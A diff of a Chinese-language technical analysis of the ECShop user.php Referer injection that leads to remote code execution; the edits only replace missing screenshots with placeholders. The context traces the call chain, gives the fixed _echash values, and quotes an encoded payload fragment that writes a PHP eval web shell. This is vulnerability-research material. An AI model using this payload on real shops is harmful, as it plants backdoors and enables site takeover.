@@ -70,9 +70,9 @@ ECShop 没有对 $GLOBAL\[‘\_SERVER’\]\[‘HTTP\_REFERER’\] 变量进行�
 ### 整体功能
 
 首先过一下整体的功能，进入到 user.php 中。  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-1.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-1.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-1.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-1.png) `）  
 正常情况下，程序会将 $GLOBALS\[‘\_SERVER’\]\[‘HTTP\_REFERER’\] 赋值给了 $back\_act，接着通过 cls\_template 模板类的 assign 和 display 进行赋值和和传值给了 user\_passport.dwt 页面模板；这时候 user\_passport.dwt 页面模板的内容是这样子的。  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-2.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-2.png)
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-2.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-2.png) `）
 
 进入到 $smarty->display 中，通过 inser\_mod 的分割和反序列之后动态调用函数获得购物信息和会员信息，将会默认执行 user\_passport.dw 上面的两个函数，即 lib\_insert 函数类下的 insert\_cart\_info 和 insert\_member\_info 函数。
 
@@ -84,9 +84,9 @@ insert\_member\_info函数 //调用会员信息
 ```
 
 user\_passport.dw 模板:  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-3.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-3.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-3.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-3.png) `）  
 inser\_mod 函数:  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-4.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-4.png)
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-4.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-4.png) `）
 
 ### Payload
 
@@ -99,7 +99,7 @@ inser\_mod 函数:
 ### 开始分析
 
 在 user.php 中的通过执行登陆操作的时候，将 $GLOBALS\[‘\_SERVER’\]\[‘HTTP\_REFERER’\] 的值修改为我们的代码  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-5.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-5.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-5.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-5.png) `）  
 这时候 $back\_act 的值就是我们篡改之后的 REFERER 值了，之后程序会继续执行：
 
 ```
@@ -110,9 +110,9 @@ $smarty->display('user\_passport.dwt'); //传值到模板上
 ```
 
 经过 assign，display 的赋值和传值之后，这时候 user\_passport.dwt 模板上的 back\_act 值是这样的：  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-6.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-6.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-6.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-6.png) `）  
 在观察堆栈参数的时候，可以观察到 this->\_echash 的值跟我们的 Payload 的值是一样的，这是 ECSHOP 的固定的 HASH 值，2.7 版本的\_echash 值为 554fcae493e564ee0dc75bdf2ebf94ca 而 3.x 版本的\_echash 值为 45ea207d7a2b68c49582d2d22adf953，所以所用的 Payload 也不一样。  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-7.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-7.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-7.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-7.png) `）  
 进入到 display 函数中，会执行 fetch 函数，获得页面模板内容；
 
 ```
@@ -122,7 +122,7 @@ $out = $this->fetch($filename, $cache\_id); //根据$cache\_id获取模板内容
 ```
 
 接着按照\_echash 的值也就是固定 hash 值进行分割；  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-8.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-8.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-8.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-8.png) `）  
 分割完之后程序会先执行两个默认函数，然后才执行我们的代码，继续执行 insert\_mod 函数 。
 
 ```
@@ -132,12 +132,12 @@ $k\[$key\] = $this->insert\_mod($val);
 ```
 
 跟进，可以看到我们输入的字符串根据`|`进行了分割，并分别赋值给了`$fun`和`$para`  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-9.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-9.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-9.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-9.png) `）  
 所以最后的到的值类似于`$fun = insert_ads $para = array(‘num’=>”*/union…”,’id’=>”*/”)`  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-10.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-10.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-10.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-10.png) `）  
 到了`return $fun($para);`这里，将会执行 lib\_insert 动态函数类下的 `insert_ads($para)`函数。  
 跟进，可以看到这里执行了 SQL 语句，而`$arr[‘id’]`和`$arr[‘num’]`这两个参数正是我们传进来的数组中的内容，参数可控，从而导致了注入。  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-17.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-17.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-17.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-17.png) `）  
 这时候在数据库中，执行的语句为：
 
 ```
@@ -146,10 +146,10 @@ SELECT a.ad\_id, a.position\_id, a.media\_type, a.ad\_link, a.ad\_code, a.ad\_na
 
 ```
 
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-11.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-11.png)
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-11.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-11.png) `）
 
 可以看到数据库的 position\_id 和 position\_style 字段分别被 union select 查询覆盖为了`'/*`和`{$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzIucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTExMV0pOyA/Picp'));//}xxx`  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-12.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-12.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-12.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-12.png) `）  
 查询结束之后, 根据 $position\_style 的值执行了 cls\_template 模板类的 fetch 函数。
 
 ```
@@ -175,9 +175,9 @@ $out = $this->\_eval($this->fetch\_str(substr($filename, 4))); //最终执行了
 ```
 
 然后使用 substr 对 filenname 进行切割，接着进入到 $this->fetch\_str 中，可以看到 fetch\_str 函数的返回内容为`<?php echo xx>`格式的。  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-13.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-13.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-13.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-13.png) `）  
 在跟入到 $this->get\_val 中，执行了`$p = $this->make_var($val);`，跟入到 make\_var 函数中。  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-14.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-14.png)  
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-14.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-14.png) `）  
 字符串处理最后返回的值为：
 
 ```
@@ -195,12 +195,12 @@ $this->\_var\['asd'\];assert(base64\_decode('ZmlsZV9wdXRfY29udGVudHMoJzIucGhwJyw
 ```
 
 从而最终导致了代码执行。  
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-15.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-15.png)
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-15.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-15.png) `）
 
 0x04 代码执行的调用链
 -------------
 
-[![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-16.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-16.png)
+**原图暂未找回**（原引用：` [![](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-16.png)](https://blog.riskivy.com/wp-content/uploads/2018/09/%E5%9B%BE%E7%89%87-16.png) `）
 
 0x05 修复方案
 ---------
